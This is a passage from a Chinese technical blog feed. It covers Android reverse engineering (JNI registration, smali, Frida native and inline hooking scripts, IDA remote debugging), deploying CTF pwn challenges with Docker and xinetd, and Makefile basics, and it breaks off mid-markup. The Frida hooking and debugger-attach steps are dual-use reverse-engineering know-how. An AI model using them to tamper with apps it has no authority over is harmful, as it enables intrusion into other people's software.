<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.native_lib;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;  </span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.learn.native_lib.databinding.ActivityMainBinding;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Used to load the &#x27;native_lib&#x27; library on application startup.  </span></span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native_lib&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);  </span><br><span class="line">  </span><br><span class="line">        binding = ActivityMainBinding.inflate(getLayoutInflater());  </span><br><span class="line">        setContentView(binding.getRoot());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// Example of a call to a native method  </span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> binding.sampleText;  </span><br><span class="line">        tv.setText(stringFromJNI());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the &#x27;native_lib&#x27; native library,     </span></span><br><span class="line"><span class="comment">     * which is packaged with this application.     </span></span><br><span class="line"><span class="comment">     * */</span>    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模拟器运行 + jadx反编译 + ida 打开so文件</p>
<h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><ol>
<li>函数名不用这么长，但是一般会与Java层的名称相同，方便开发</li>
<li>JNI_Onload 函数，动态注册</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> classname <span class="string">&quot;com/learn/native_demo/MainActivity&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> jclass myClass;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span> </span>&#123;</span><br><span class="line">	JNIEnv* env = <span class="literal">NULL</span>; </span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//1. 从JavaVM获取JNIEnv，这里使用1.4的版本</span></span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 获取映射的java类</span></span><br><span class="line">    myClass = env-&gt;<span class="built_in">FindClass</span>(className);</span><br><span class="line">    <span class="keyword">if</span>(myClass == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;cannot get class:%s\n&quot;</span>, className);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 通过RegisterNatives方法动态注册</span></span><br><span class="line">    <span class="keyword">if</span>(env-&gt;<span class="built_in">RegisterNatives</span>(myClass, gMethods, <span class="built_in">sizeof</span>(gMethods)/<span class="built_in">sizeof</span>(gMethods[<span class="number">0</span>])) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;register native method failed!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. 返回版本，否则加载会失败。</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_4;                  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>动态注册，主要靠JNIEnv的RegisterNatives函数</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">jint <span class="title">RegisterNatives</span><span class="params">(jclass clazz, <span class="type">const</span> JNINativeMethod* methods,</span></span></span><br><span class="line"><span class="params"><span class="function">        jint nMethods)</span></span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>我们需要自定义 JNINativeMethod 数组</li>
</ol>
<ul>
<li><code>getNativeString</code>为Java类中定义的Native方法名。</li>
<li><code>()Ljava/lang/String;</code> 为方法的签名， <code>()</code>表示该方法无参数</li>
<li><code>reinterpret_cast&lt;void*&gt;(getString)</code> 为Native实现的方法名。这里强制转换成了函数指针。</li>
<li>这些函数都需要我们实现</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;getNativeString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(getString)&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h2 id="smali-语法"><a href="#smali-语法" class="headerlink" title="smali 语法"></a>smali 语法</h2><p>Dalvik 虚拟机：Dalvik 是 Google 专门为 Android 平台设计的虚拟机。虽然 Android 程序可以使用 Java 语言来进行开发，但 Dalvik VM 和 Java VM 是两款不同的虚拟机。Dalvik VM 基于寄存器，而 Java VM 基于栈 。Dalvik VM 有专门的文件执行格式 dex (Dalvik Executable)，而 Java VM 则执行的是 Java 字节码。DVM 比 JVM 速度更快，占用的空间更少。</p>
<p>不必要死记硬背，使用时查表，用着就熟悉了</p>
<p><a href="https://ctf-wiki.org/android/basic_operating_mechanism/java_layer/smali/smali/">Smali - CTF Wiki (ctf-wiki.org)</a></p>
<h2 id="Firda"><a href="#Firda" class="headerlink" title="Firda"></a>Firda</h2><blockquote>
<p>只能说多看官方文档</p>
</blockquote>
<p>命令使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 旧版 </span></span><br><span class="line">frida -U &lt;package_name&gt; -l hook.js  --no-pause</span><br><span class="line"><span class="comment"># 新版默认不会暂停，使用--pause 暂停 。</span></span><br><span class="line">frida-ps -Uai  // 获得名称</span><br><span class="line">frida -U  &lt;name&gt; -l hook.js </span><br></pre></td></tr></table></figure>

<p>某些方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取环境变量，就是获取 JNIEnv ，并且我们可以调用JNIEnv的方法</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型转化</span></span><br><span class="line"><span class="title function_">hexdump</span>()</span><br><span class="line"><span class="title function_">readCString</span>() </span><br><span class="line"><span class="title function_">toInt32</span>()</span><br></pre></td></tr></table></figure>

<h3 id="native-hook"><a href="#native-hook" class="headerlink" title="native hook"></a>native hook</h3><ol>
<li>获得so基址</li>
<li>获得函数基址，进行attach，两个方法，进入函数(onEnter)和退出函数(onLeave)的操作</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> lib_name = <span class="string">&quot;xxx.so&quot;</span></span><br><span class="line">  <span class="keyword">let</span> func_offset = <span class="number">0x114514</span>;</span><br><span class="line">  <span class="keyword">let</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(lib_name);</span><br><span class="line">  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc base: &quot;</span> + libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 一般so层函数第一个参数都是JniEnv，第二个参数是jclass</span></span><br><span class="line">  <span class="keyword">let</span> func_addr = libc_base.<span class="title function_">add</span>(func_offset);</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">      <span class="comment">// console.log(&quot;args[0] = \n&quot; + hexdump(args[0]));</span></span><br><span class="line">      <span class="comment">// console.log(&quot;args[1] = \n&quot; + hexdump(args[1]));</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">2</span>]));</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[3] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">3</span>]));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;function return&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;return =&gt; &quot;</span> + <span class="title function_">hexdump</span>(retval));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><blockquote>
<p>卡死的几率比较高</p>
</blockquote>
<ol>
<li>获得指令的地址</li>
<li>打印上下文 context</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">context</span>))</span><br><span class="line">    <span class="comment">// 具体的寄存器值</span></span><br><span class="line">    conslole.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="IDA-Attach"><a href="#IDA-Attach" class="headerlink" title="IDA Attach"></a>IDA Attach</h2><blockquote>
<p>IDA yyds</p>
</blockquote>
<ol>
<li>手机启动 IDA Pro <code>dbgsrv</code> 中的 android_server(x86_64 或者 arm 根据机型选择)</li>
<li>端口转发</li>
<li>IDA Pro 顶栏 Debugger -&gt; Attach -&gt; Remote Android debugger</li>
</ol>
<p>需要端口转发才能attach，将android端口转发一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://developer.android.com/reference/android/os/Bundle">Bundle Android Developers</a></li>
<li><a href="https://frida.re/docs/home/">Frida • A world-class dynamic instrumentation toolkit</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/520523247?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg3NDkwNTMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODc0ODc1MywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM1Mjk0Njk4M30.3D24gUz7Zah8RqqqLRzUIr5z1PlHm7nDF22mMsj6zBw">JNI动态注册、静态注册实例及其实现原理分析</a></li>
</ul>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF 出题</title>
    <url>/2023/09/16/CTF%20%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<blockquote>
<p>怎么出题部署环境？</p>
</blockquote>
<span id="more"></span>

<h3 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h3><ol>
<li>首先肯定是安装docker</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>写题目</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chall</span><br><span class="line">├── flag.txt</span><br><span class="line">├── vuln</span><br><span class="line">├── vuln.c</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>docker 部署，在同级目录添加 Dockerfile，同时配合 xinetd<ul>
<li>修改文件中内容，看注释</li>
</ul>
</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update --fix-missing &amp;&amp; apt-get -y dist-upgrade</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y install lib32z1 xinetd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r pwn &amp;&amp; useradd -r -g pwn pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash\n    \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">service xinetd restart &amp;&amp; /bin/sleep infinity&#x27;</span> &gt; /etc/init.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### change server</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;service pwn\n       \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">&#123;\n                           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  type = UNLISTED\n           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  disable = no\n              \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  socket_type = stream\n      \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  protocol = tcp\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  wait = no\n                 \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  user = pwn\n                \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  bind = 0.0.0.0\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  port = 9999\n               \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  server = /home/pwn/vuln\n   \         </span></span></span><br><span class="line">&#125;<span class="string">&#x27; &gt; /etc/xinetd.d/pwn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chmod 500 /etc/init.sh</span></span><br><span class="line"><span class="string">RUN chmod 444 /etc/xinetd.d/pwn </span></span><br><span class="line"><span class="string">RUN chmod 1733 /tmp /var/tmp /dev/shm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ADD chall/flag.txt /flag.txt            ####### change flag</span></span><br><span class="line"><span class="string">RUN chmod 444 /flag.txt               </span></span><br><span class="line"><span class="string">RUN mv /flag.txt /flag-$(md5sum flag.txt | awk &#x27;</span>&#123;print $<span class="number">1</span>&#125;<span class="string">&#x27;).txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WORKDIR /home/pwn</span></span><br><span class="line"><span class="string">ADD chall/vuln .                        ###### change chall file</span></span><br><span class="line"><span class="string">RUN chmod 550 vuln</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chown -R root:pwn /home/pwn</span></span><br><span class="line"><span class="string">RUN service xinetd restart</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>docker-compose.yml<ul>
<li>自己更改端口就行</li>
</ul>
</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">vuln:</span>                       <span class="comment"># change name</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">      <span class="attr">core:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;1234:9999&quot;</span>           <span class="comment"># change port</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">/etc/init.sh</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<p><strong>坑点</strong>：docker部署题目时，在程序里必须将缓冲器置为0，否则不会显示？</p>
<h3 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h3><ul>
<li><p>下载这个链接 <a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a>，部署比较简单。</p>
</li>
<li><p>修改 bin目录 里的 二进制文件和 flag 文件</p>
</li>
<li><p>dockerfile 修改一行</p>
</li>
</ul>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 改为</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ctf.xinetd 修改</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server_args = --userspec=1000:1000 /home/ctf ./helloworld</span><br><span class="line"></span><br><span class="line"># 修改</span><br><span class="line">server_args = --userspec=1000:1000 /home/ctf 自己的漏洞程序</span><br></pre></td></tr></table></figure>

<ul>
<li>最后执行README 里的 两条命令就行，比如</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;vuln&quot;</span> .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将pub_port 自己想要的端口</span></span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class="string">&quot;vuln&quot;</span> --name=<span class="string">&quot;vuln&quot;</span> vuln</span><br></pre></td></tr></table></figure>


<p>查看了一眼其内容，使用 chroot沙盒，将文件系统的根目录转化为原先的 <code>/home/ctf</code> 目录，所以要在dockerfile中将lib全部拷贝一份</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server      = /usr/sbin/chroot</span><br></pre></td></tr></table></figure>

<h3 id="pwn-deploy-chroot"><a href="#pwn-deploy-chroot" class="headerlink" title="pwn_deploy_chroot"></a>pwn_deploy_chroot</h3><ul>
<li>部署多道ctf题目： <a href="https://github.com/giantbranch/pwn_deploy_chroot">giantbranch&#x2F;pwn_deploy_chroot</a>，<a href="http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/">教程</a> 写的很详细。使用起来也很容易</li>
</ul>
<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><ul>
<li>内核题目部署，使用 ctf_xinetd 举例</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chall  </span><br><span class="line">├── ctf.xinetd  </span><br><span class="line">├── Dockerfile  </span><br><span class="line">├── bin  </span><br><span class="line">│ ├── run.sh  </span><br><span class="line">│ ├── bzImage  </span><br><span class="line">│ └── rootfs.cpio  </span><br><span class="line">├── README.md</span><br><span class="line">└── start.sh </span><br></pre></td></tr></table></figure>

<ul>
<li>docker 安装环境</li>
</ul>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>  </span><br><span class="line"></span><br><span class="line">DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \  </span></span><br><span class="line">	apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \  </span><br><span class="line">	apt-get install -y lib32z1 xinetd git libglib2.<span class="number">0</span>-dev libfdt-dev \</span><br><span class="line">	libpixman-<span class="number">1</span>-dev zlib1g-dev qemu qemu-system-x86  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m pwn</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./chall/ /  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/run.sh&quot;</span>]  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">25000</span></span><br></pre></td></tr></table></figure>

<ul>
<li>重要的是修改 ctf.xinetd  文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service ctf  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">disable</span> = no  </span><br><span class="line">socket_type = stream  </span><br><span class="line">protocol = tcp  </span><br><span class="line"><span class="built_in">wait</span> = no  </span><br><span class="line">user = pwn  </span><br><span class="line"><span class="built_in">type</span> = UNLISTED  </span><br><span class="line">port = 25000  </span><br><span class="line"><span class="built_in">bind</span> = 0.0.0.0  </span><br><span class="line">server = /run.sh    <span class="comment"># 修改处</span></span><br><span class="line"><span class="comment"># replace helloworld to your program  </span></span><br><span class="line">banner_fail = /etc/banner_fail  </span><br><span class="line"><span class="comment"># safety options  </span></span><br><span class="line">per_source = 10 <span class="comment"># the maximum instances of this service per source IP address  </span></span><br><span class="line">rlimit_cpu = 20 <span class="comment"># the maximum number of CPU seconds that the service may use  </span></span><br><span class="line"><span class="comment">#rlimit_as = 1024M # the Address Space resource limit for the service  </span></span><br><span class="line"><span class="comment">#access_times = 2:00-9:00 12:00-24:00  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Cmake 使用</title>
    <url>/2023/09/09/Cmake%20%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>编写自动化构建脚本</p>
</blockquote>
<span id="more"></span>

<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><ul>
<li><p>应该叫 GNU Make，在Linux 平台常用</p>
</li>
<li><p>打印信息</p>
</li>
</ul>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不显示中间过程以及命令</span></span><br><span class="line">@echo <span class="string">&quot;begin make&quot;</span></span><br><span class="line">@<span class="variable">$(CXX)</span>  <span class="variable">$^</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line">@echo <span class="string">&quot;build success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 报错处理, 报错后不会向下执行，我们在前面加上一个 `-` 符号就行</span></span><br></pre></td></tr></table></figure>

<ul>
<li>项目结构</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hello/</span><br><span class="line">├── main.cpp</span><br><span class="line">├── factorial.cpp</span><br><span class="line">├── printhello.cpp</span><br><span class="line">└── functions.h</span><br></pre></td></tr></table></figure>

<ul>
<li>朴素版</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">g++ main.cpp factorial.cpp printhello.cpp -o main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure>

<h3 id="version1"><a href="#version1" class="headerlink" title="version1"></a>version1</h3><ul>
<li>tab而不是空格</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">hello: main.cpp printhello.cpp factorial.cpp</span></span><br><span class="line">	g++ -o hello main.cpp printhello.cpp factorial.cpp</span><br></pre></td></tr></table></figure>

<h3 id="version2"><a href="#version2" class="headerlink" title="version2"></a>version2</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"><span class="section">main.o: main.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c main.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">printhello.o: printhello.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c printhello.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">factorial.o: factorial.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c factorial.cpp</span><br></pre></td></tr></table></figure>

<h3 id="version3"><a href="#version3" class="headerlink" title="version3"></a>version3</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wall warning all</span></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHONY 避免冲突。比如有一个 clean 的可执行文件？</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<h3 id="version4"><a href="#version4" class="headerlink" title="version4"></a>version4</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件下所有的cpp</span></span><br><span class="line">SRC = <span class="variable">$(<span class="built_in">wildcard</span> *.cpp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 意思为 SRC中的.cpp替换为.o</span></span><br><span class="line">OBJ = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, %.o, <span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span 